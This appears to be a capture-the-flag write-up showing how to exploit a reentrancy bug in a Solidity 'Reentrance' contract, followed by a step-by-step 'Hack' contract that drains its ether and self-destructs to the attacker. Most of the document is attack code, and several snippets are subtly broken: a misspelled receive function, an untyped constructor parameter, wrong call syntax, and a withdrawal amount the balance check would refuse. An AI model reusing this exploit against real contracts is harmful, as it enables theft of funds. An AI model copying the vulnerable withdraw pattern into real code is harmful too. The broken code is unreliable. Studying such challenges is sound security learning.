## Reentrancy Challenge

## The goal of this challenge is to steal all the ether from the contract and perform a reentrancy attack.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

As you can see there is a donate function in this contract that is payable and requires us to send ether to the contract in order to be able to call the withdraw function.
So the flow basically goes like this => Donate => Withdraw

But to perform a reentrancy attack we need to call the fallback or receive function in order to be able to take all the ether out of the contract.

**Note** fallback and receive functions execute when ether is sent to the contract.

Let's go ahead and perform an attack in the following steps

- Create an interface for the functions we will be calling.

```javascript
pragma solidity ^0.8.0;

interface IReentrancy {

    function donate(address) external payable;

    function withdraw(uint256) external;

}
```

- Pass the contract from the interface in the constructor as the targetted contract.

```javascript

contract Hack {
    IReentrancy private immutable target;

    constructor(_target) {
        target = IReentrancy(_target);
    }

}
```

- Next up let's call the donate function within a new function called attack as well as the withdraw function.

```javascript
function attack() external payable {
    target.donate({ value: 1e18 })(address(this));
    target.withdraw(1e18);
}
```

- This will call the donate function first and then withdraw the sent ether. But we also want to steal the rest of the ether in the contract, to do that we will call the withdraw function inside a recieve/fallback that will be called everytime ether is sent to the contract.

```javascript
recieve() external payable{
    uint256 amount = address(target).balance;
    if(amount > 0) {
        target.withdraw(amount);
    }
}
```

That should do it, but in order to steal the ether to our wallet we can send the ether to our contract after the attack is successfull.

```javascript
function attack() external payable {
    target.donate({ value: 1e18 })(address(this));
    target.withdraw(1e18);
    require(address(target).balance == 0, "Balance > 0");
    selfdestruct(payable(msg.sender));
}
```
